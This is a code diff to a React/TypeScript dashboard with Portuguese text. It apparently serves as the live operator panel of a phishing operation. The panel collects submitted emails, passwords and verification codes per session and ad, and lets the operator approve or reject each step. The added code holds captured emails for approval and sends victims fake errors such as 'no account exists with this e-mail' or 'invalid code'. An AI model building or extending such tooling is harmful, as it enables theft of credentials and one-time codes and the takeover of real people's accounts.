@@ -47,6 +47,7 @@ interface AttemptRow {
   code: string;
   codeAt: string;
   status: "pending" | "approve" | "reject";
+  kind: "email" | "code";
 }
 
 interface ActiveSession {
@@ -449,6 +450,7 @@ export default function Dashboard() {
           code: c.value,
           codeAt: c.created_at,
           status: codeStatus.get(`${c.created_at}-${c.value}`) || "pending",
+          kind: "code",
         });
       }
     }
@@ -456,7 +458,58 @@ export default function Dashboard() {
     return rows.sort((a, b) => b.codeAt.localeCompare(a.codeAt));
   }, [leads, actions]);
 
-  const pendingCount = attempts.filter((a) => a.status === "pending").length;
+  const emailPendingRows = useMemo(() => {
+    const bySession = new Map<string, LeadRow[]>();
+    for (const lead of leads) {
+      const arr = bySession.get(lead.session_id) || [];
+      arr.push(lead);
+      bySession.set(lead.session_id, arr);
+    }
+
+    const lastDecisionBySession = new Map<string, string>();
+    for (const action of actions) {
+      if (action.action !== "approve" && action.action !== "reject") continue;
+      const prev = lastDecisionBySession.get(action.session_id);
+      if (!prev || action.created_at.localeCompare(prev) > 0) {
+        lastDecisionBySession.set(action.session_id, action.created_at);
+      }
+    }
+
+    const rows: AttemptRow[] = [];
+    for (const [sid, items] of bySession) {
+      const latestEmail = [...items]
+        .filter((item) => item.field_name === "email_submitted")
+        .sort((a, b) => a.created_at.localeCompare(b.created_at))
+        .pop();
+      if (!latestEmail) continue;
+
+      const hasAdvancedPastEmail = items.some(
+        (item) =>
+          (item.field_name === "password_submitted" || item.field_name === "code_submitted") &&
+          item.created_at > latestEmail.created_at,
+      );
+      if (hasAdvancedPastEmail) continue;
+
+      const lastDecision = lastDecisionBySession.get(sid);
+      if (lastDecision && lastDecision.localeCompare(latestEmail.created_at) >= 0) continue;
+
+      rows.push({
+        key: `email-${sid}-${latestEmail.created_at}`,
+        session_id: sid,
+        ad_id: latestEmail.ad_id,
+        email: latestEmail.value,
+        password: "—",
+        code: "Aguardando aprovação",
+        codeAt: latestEmail.created_at,
+        status: "pending",
+        kind: "email",
+      });
+    }
+
+    return rows.sort((a, b) => b.codeAt.localeCompare(a.codeAt));
+  }, [leads, actions]);
+
+  const pendingCount = attempts.filter((a) => a.status === "pending").length + emailPendingRows.length;
   const approvedCount = attempts.filter((a) => a.status === "approve").length;
   const rejectedCount = attempts.filter((a) => a.status === "reject").length;
 
@@ -473,7 +526,10 @@ export default function Dashboard() {
   }, [attempts]);
 
   // Separa em "ao vivo" (acionáveis) e "histórico" (resto)
-  const live = attempts.filter((a) => actionableKeys.has(a.key));
+  const live = useMemo(
+    () => [...attempts.filter((a) => actionableKeys.has(a.key)), ...emailPendingRows].sort((a, b) => b.codeAt.localeCompare(a.codeAt)),
+    [attempts, actionableKeys, emailPendingRows],
+  );
   const historyFromAttempts = attempts.filter((a) => !actionableKeys.has(a.key));
 
   // Mapa session_id -> tentativa PENDENTE mais recente, pra mostrar
@@ -481,7 +537,7 @@ export default function Dashboard() {
   // (essencial em telas micro tipo smartwatch onde só essa seção aparece).
   const pendingBySession = useMemo(() => {
     const map = new Map<string, AttemptRow>();
-    for (const a of attempts) {
+    for (const a of [...attempts, ...emailPendingRows]) {
       if (a.status !== "pending") continue;
       const prev = map.get(a.session_id);
       if (!prev || a.codeAt.localeCompare(prev.codeAt) > 0) {
@@ -489,7 +545,7 @@ export default function Dashboard() {
       }
     }
     return map;
-  }, [attempts]);
+  }, [attempts, emailPendingRows]);
 
   // Sessões em andamento: têm e-mail mas não têm tentativa pendente acionável.
   // (Quem já tá em "Ao vivo" sai daqui pra evitar duplicar.)
@@ -566,6 +622,7 @@ export default function Dashboard() {
       code: "—",
       codeAt: s.lastActivity,
       status: "reject",
+      kind: "code",
     }));
     return [...historyFromAttempts, ...stale].sort((a, b) =>
       b.codeAt.localeCompare(a.codeAt),
@@ -579,7 +636,7 @@ export default function Dashboard() {
   useEffect(() => {
     notifyIncrease("pending", pendingCount, {
       title: "Nova tentativa pendente",
-      body: "Tem código aguardando aprovação no painel.",
+      body: "Tem validação aguardando aprovação no painel.",
     });
   }, [pendingCount, notifyIncrease]);
   useEffect(() => {
@@ -595,7 +652,9 @@ export default function Dashboard() {
       ad_id: row.ad_id,
       session_id: row.session_id,
       action,
-      payload: action === "reject" ? { message: "Código inválido" } : null,
+      payload: action === "reject"
+        ? { message: row.kind === "email" ? "Não existe uma conta com este e-mail." : "Código inválido" }
+        : null,
     });
     setBusy(null);
     if (error) return toast.error(error.message);
